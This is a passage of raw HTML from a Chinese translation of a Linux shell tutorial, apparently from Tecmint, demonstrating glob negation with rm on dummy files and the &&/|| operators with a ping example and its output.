title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~$ mkdir tecmint \r\ntecmint@localhost:~$ cd tecmint</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b179852180670-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b179852180670-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b179852180670-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mkdir </span><span class=\"crayon-e\">tecmint </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b179852180670-2\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">tecmint</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>接下来，在文件夹‘<strong>tecmint</strong>’下创建不同类型的文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b17d593179220\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~/tecmint$ touch a.doc b.doc a.pdf b.pdf a.xml b.xml a.html b.html</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b17d593179220-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b17d593179220-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">touch</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">doc</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">doc</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pdf</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pdf</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">xml</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">xml</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">html</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>看一下我们在文件夹‘<strong>tecmint</strong>’创建的新文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b180272990395\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~/tecmint$ ls \r\n\r\na.doc  a.html  a.pdf  a.xml  b.doc  b.html  b.pdf  b.xml</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b180272990395-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b180272990395-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b180272990395-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b180272990395-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b180272990395-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b180272990395-3\"><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">doc</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pdf</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">xml</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">doc</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pdf</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">xml</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>用一种聪明的办法马上删除除了 ‘<strong>html</strong>’之外的所有文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b183901939122\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~/tecmint$ rm -r !(*.html)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b183901939122-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b183901939122-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rm</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">html</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>验证一下上次的执行结果，使用<a href=\"http://www.tecmint.com/15-basic-ls-command-examples-in-linux/\" target=\"_blank\" rel=\"external nofollow\">ls 命令</a>列出可见所有文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b186724888628\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~/tecmint$ ls \r\n\r\na.html  b.html</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b186724888628-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b186724888628-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b186724888628-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b186724888628-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b186724888628-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b186724888628-3\"><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">html</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3>6. 与或操作符 (&amp;&amp; – ||)</h3>\n<p>上面的操作符实际上是‘<strong>与</strong>’和‘<strong>或</strong>’操作符的组合。它很像‘<strong>if-else</strong>‘语句。</p>\n<p>比如，我们ping <strong>tecmint.com</strong>，如果成功打印‘<strong>已验证</strong>’，否则打印‘<strong>主机故障</strong>’。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b189962452138\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~/tecmint$ ping -c3 www.tecmint.com &amp;&amp; echo \"Verified\" || echo \"Host Down\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b189962452138-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b189962452138-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ping</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">c3 </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Verified\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Host Down\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h4>示例输出</h4>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b18d899875719\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nPING www.tecmint.com (212.71.234.61) 56(84) bytes of data. \r\n64 bytes from www.tecmint.com (212.71.234.61): icmp_req=1 ttl=55 time=216 ms \r\n64 bytes from www.tecmint.com (212.71.234.61): icmp_req=2 ttl=55 time=224 ms \r\n64 bytes from www.tecmint.com (212.71.234.61): icmp_req=3 ttl=55 time=226 ms \r\n\r\n--- www.tecmint.com ping statistics --- \r\n3 packets transmitted, 3 received, 0% packet loss, time 2001ms \r\nrtt min/avg/max/mdev = 216.960/222.789/226.423/4.199 ms \r\nVerified</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b18d899875719-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b18d899875719-1\"><span class=\"crayon-e\">PING </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">212.71.234.61</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">56</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">84</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bytes </span><span class=\"crayon-e\">of </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b18d899875719-2\"><span class=\"crayon-cn\">64</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bytes </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">212.71.234.61</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">icmp_req</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ttl</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">55</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">216</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ms</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b18d899875719-3\"><span class=\"crayon-cn\">64</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bytes </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">212.71.234.61</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">icmp_req</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ttl</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">55</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">224</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ms</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" 